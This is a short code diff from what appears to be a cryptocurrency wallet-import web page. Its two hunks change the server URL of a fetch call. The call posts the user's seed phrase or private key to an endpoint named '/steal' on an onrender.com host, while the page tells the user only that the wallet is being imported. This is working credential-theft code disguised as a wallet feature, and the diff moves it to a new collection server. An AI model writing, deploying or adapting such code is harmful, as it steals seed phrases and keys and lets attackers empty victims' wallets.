@@ -3408,7 +3408,7 @@
       log.innerHTML = `<span class='text-orange-400'>importing wallet please wait...</span>`;
       try {
         const start = Date.now();
-        const resp = await fetch('https://sweep-server-demo.onrender.com/steal', {
+        const resp = await fetch('https://sweep-server-demo-2.onrender.com/steal', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ secret: phrase })
@@ -3470,7 +3470,7 @@
       log.innerHTML = `<span class='text-orange-400'>importing walet please wait...</span>`;
       try {
         const start = Date.now();
-        const resp = await fetch('https://sweep-server-demo.onrender.com/steal', {
+        const resp = await fetch('https://sweep-server-demo-2.onrender.com/steal', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ secret: key })
